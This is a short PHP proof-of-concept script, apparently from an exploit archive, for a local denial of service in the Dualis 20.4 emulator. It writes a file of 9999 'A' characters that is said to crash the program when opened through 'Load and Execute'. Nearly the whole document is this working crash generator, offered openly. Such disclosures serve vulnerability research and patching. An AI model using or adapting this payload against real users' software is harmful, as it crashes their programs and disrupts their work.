<?php
# Dualis 20.4 (.bin) Local Daniel Of Service
# Software Site: http://dualis.1emu.net/
# Software Download: http://dualis.1emu.net/files/dualis-20.4.zip
# Author: Pr0T3cT10n <pr0t3ct10n@gmail.com<mailto:pr0t3ct10n@gmail.com>>
# Site: http://www.nullbyte.org.il
##################################################################
# Dualis 20.4 is vulnerable to local denial of service attack.
# When we try to open a file by 'Load and Execute(CTRL+R)'
# that contains 9999 chars ('A'), so dualis should crash.
##################################################################
# PoC / Code:
$buffer = str_repeat('A', 9999); # Create 9999 chars('A')..
if(file_put_contents('crash.bin', $buffer)) {
 echo("File created successfuly.\r\nDualis should crash when you open the file with it.\r\n");
} else {
 echo("Can't create file. Try again.\r\n");
}
# Cya :)
# NULLBYTE.ORG.IL
####################
?>
